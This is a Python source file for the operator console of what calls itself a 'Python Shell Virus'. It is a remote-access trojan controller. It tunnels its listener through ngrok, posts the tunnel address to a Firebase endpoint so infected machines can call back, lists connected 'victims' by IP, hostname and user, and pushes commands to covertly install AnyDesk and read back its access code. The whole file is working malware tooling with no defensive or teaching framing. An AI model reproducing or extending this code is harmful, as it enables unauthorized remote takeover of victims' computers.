import subprocess
import os
import socket
import threading
import tkinter as tk
import requests
from tkinter import ttk
from tkinter.messagebox import showerror, showinfo

from constants import *
from .victim import AnyDeskAlreadyInstalled, AnyDeskNotInstalled, ThereIsAlreadyOneRunningCommand, Victim


class Gui:

    victimsList = []

    def __init__(self, IP, PORT, victimsList=[]):
        """
        param 1: the ip of the server
        param 2: the port of the server
        param 3: list of the avaliable commands
        param 4: function which has to be called when the start button is clicked
        param 5: initial victims list

        param 1 type: str
        param 2 type: int
        param 3 type: list
        param 4 type: function
        param 5 type: list
        """

        self.selectedVictim = None
        self.IP = IP
        self.PORT = PORT
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # The GUI Template
        self.window = tk.Tk()
        self.window.title("Python Shell Virus")

        self.victimsListBox = victimsList

        # for scrolling vertically
        yscrollbar = tk.Scrollbar(self.window)
        yscrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # Headers Labels
        tk.Label(text="Welcome To The Python Virus Shell!").pack()
        tk.Label(text="What Would You Like To Do?").pack()

        # Opertaion list
        self.variable = tk.StringVar(self.window)
        self.variable.set(INSTALL_ANYDESK_COMMAND)  # default value
        opertaionList = tk.OptionMenu(
            self.window, self.variable, *[INSTALL_ANYDESK_COMMAND, GET_CODE_COMMAND, POWER_ON_ANYDESK_COMMAND, POWER_OFF_ANYDESK_COMMAND, UNINSTALL_PROGRAM_COMMAND])

        opertaionList.pack()

        self.victimsTable = ttk.Treeview(self.window, columns=(
            "ip", "port", "computer_name", "logged_user_name", "is_anydesk_installed"), yscrollcommand=yscrollbar.set)

        self.victimsTable.heading(
            "ip", text="IP")
        self.victimsTable.heading(
            "port", text="Port")
        self.victimsTable.heading(
            "computer_name", text="Computer Name")
        self.victimsTable.heading("logged_user_name",
                                  text="Logged User Name")
        self.victimsTable.heading("is_anydesk_installed",
                                  text="Is AnyDesk Installed?")
        self.victimsTable.pack(padx=10, pady=10,
                               expand=tk.YES, fill="both")
        self.victimsTable.bind('<<TreeviewSelect>>',
                               self.victims_table_item_selected)
        # Attach Treeview to vertical scrollbar
        yscrollbar.config(command=self.victimsTable.yview)

        x = list(self.victimsList)
        for each_item in range(len(x)):
            victim_ip, victim_port = x[each_item].getAddr()
            self.victimsTable.insert('', tk.END, values=(
                victim_ip, victim_port, x[each_item].computerName, x[each_item].loggedUserName, x[each_item].isAnyDeskInstalled))

        # Start Button
        startBtn = tk.Button(
            text="Start!",
            command=lambda:  threading.Thread(
                target=self.startButtonOnClick).start()
        )
        startBtn.pack()

        threading.Thread(target=self.initializeServer).start()

        self.buildGUI()  # Build the gui

    def victims_table_item_selected(self, event):
        """
        Called when item in the victims table is clicked

        So we will update our self.selectedVictim
        """
        for selected_item in self.victimsTable.selection():

            item = self.victimsTable.item(selected_item)
            values = item['values']
            ip = values[0]
            port = values[1]

            for i in self.victimsList:
                victim_ip, victim_port = i.getAddr()
                if victim_ip == ip and victim_port == port:
                    self.selectedVictim = i

    def startButtonOnClick(self):
        """
        Called when the start button is clicked

        param 1: the selected option (command to execute)

        param 1 type: str
        """
        selectedCommand = self.variable.get()

        if self.selectedVictim == None:
            self.showError("Error", "Please choose a victim!")
        else:
            try:
                self.processCommand(selectedCommand)

            except socket.error:
                self.removeVictim(self.selectedVictim)
                self.showError(
                    "Error", f"The victim {self.selectedVictim.getAddr()} has been disconnected!")

            except ThereIsAlreadyOneRunningCommand:
                self.showError(
                    "Error", "Can't perform another command while 1 is running! wait for the running one to finish!")

            except AnyDeskNotInstalled:
                self.showError(
                    "Error", "Can't perform this command because anydesk does not installed!")

            except AnyDeskAlreadyInstalled:
                self.showError(
                    "Error", "Can't perform this command because anydesk is already installed!")

    def processCommand(self, command):
        """
        Processes and executes the command

        param 2: the command to executes

        param 2 type: str
        """

        if command == INSTALL_ANYDESK_COMMAND:
            code = self.selectedVictim.initialize()
            self._updateVictimGui(self.selectedVictim.id, self.selectedVictim.ip,
                                  self.selectedVictim.port, self.selectedVictim.computerName, self.selectedVictim.loggedUserName, True)
            self.showInfo(
                "Anydesk code", f"The anydesk code for this victim is {code}")

        elif command == GET_CODE_COMMAND:
            code = self.selectedVictim.getCode()
            self.showInfo(
                "Anydesk code", f"The anydesk code for this victim is {code}")

        elif command == POWER_ON_ANYDESK_COMMAND:
            self.selectedVictim.powerOnAnydesk()
            self.showInfo(
                "ANYDESK STATE", f"Anydesk has been sucessfully powered on!")

        elif command == POWER_OFF_ANYDESK_COMMAND:
            self.selectedVictim.powerOffAnydesk()
            self.showInfo(
                "ANYDESK STATE", f"Anydesk has been sucessfully powered off!")

        elif command == UNINSTALL_PROGRAM_COMMAND:
            self.selectedVictim.uninstallProgram()
            self.removeVictim(self.selectedVictim)
            self.selectedVictim = None
            self.showInfo(
                "ANYDESK STATE", f"Anydesk has been sucessfully uninstalled!")

    def _updateVictimGui(self, victimId, newIp, newPort, newComputerName, newLoggedUsername, newIsAnyDeskInstalled):
        """
        Updates the gui of some victim

        param 2: the victim id
        param 3 - 7: updated values

        param 3 - 7 type: str
        """

        victim_index = self.victimsTable.index(victimId)
        self.victimsTable.delete(victimId)
        self.victimsTable.insert('', victim_index, iid=victimId, values=(
            newIp, newPort, newComputerName, newLoggedUsername, newIsAnyDeskInstalled))

    def initializeServer(self):
        """
        Initializes the server
        """
        self._initializeNgrok()

        self.socket.bind((self.IP, self.PORT))
        self.socket.listen()

        while True:
            clientSoc, clientAddr = self.socket.accept()
            print(f"{clientAddr} has been connected!")

            victim = Victim(clientSoc)
            self.addVictim(victim)

    def _initializeNgrok(self):
        """
        Initialize ngrok
        """

        # Contains the path to the ngrok exe file
        ngrok_file_path = os.path.join(os.path.dirname(
            os.path.dirname(os.path.dirname(__file__))), "ngrok.exe")

        # Will contains the address of the ngrok server
        ngrok_url = None

        # Kills ngrok if running
        process = subprocess.run("taskkill /f /im ngrok.exe")
        # Gets the address of the ngrok server
        process = subprocess.Popen(
            f'{ngrok_file_path} tcp {self.PORT} --log "stdout"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            output = process.stdout.readline()
            if not output and process.poll() is not None:
                break
            elif b'url=' in output:
                output = output.decode()
                output = output[output.index('url=tcp://') + 10: -1]
                ngrok_url = output.split(':')
                break

        ngrok_ip = socket.gethostbyname(ngrok_url[0])
        ngrok_port = ngrok_url[1]

        # Updates the ip&port on the server
        request = requests.patch("https://sc-initiation-5d638-default-rtdb.firebaseio.com/.json",
                                 json={
                                     "ip": ngrok_ip,
                                     "port": ngrok_port,
                                 })

        if(request.status_code != 200):
            raise Exception("Can't update ip!")

        print(
            "Ngrok has been sucessfully launched! and the ip has been sucessfully updated!")
        print(f"IP:{ngrok_ip} PORT:{ngrok_port}")

    def addVictim(self, victim):
        """
        Adds new victim to the program (for example when new victim is connected)

        param 1: the victim object
        param 1 type: Victim
        """

        # Adds the new victim to the victims list
        self.victimsList.append(victim)
        # Add the new victim to the victims listbox
        # self.victimsListBox.insert(tk.END, victim.getAddr())
        victim_ip, victim_port = victim.getAddr()
        self.victimsTable.insert('', tk.END, iid=victim.id, values=(
            victim_ip, victim_port, victim.computerName, victim.loggedUserName, victim.isAnyDeskInstalled))

    def removeVictim(self, victim):
        """
        Removes a victim from the program (for example when victim is disconnected)

        param 1: the victim object
        param 1 type: Victim
        """

        # Removes the victim from the victims list
        self.victimsList.remove(victim)

        # Removes the victim from the victims list gui
        self.victimsTable.delete(victim.id)

    def buildGUI(self):
        """
        Builds the GUI
        """
        self.window.mainloop()

    def showError(self, title, desc):
        """
        Shows error dialog

        param 1: the title of the dialog
        param 2: the description of the dialog

        param 1, 2 type: str
        """

        tk.Tk().withdraw()  # TODO: check that becuase i saw this on the stackoverflow example
        showerror(title, desc)

    def showInfo(self, title, desc):
        """
        Shows info dialog

        param 1: the title of the dialog
        param 2: the description of the dialog

        param 1, 2 type: str
        """

        tk.Tk().withdraw()  # TODO: check that becuase i saw this on the stackoverflow example
        showinfo(title, desc)
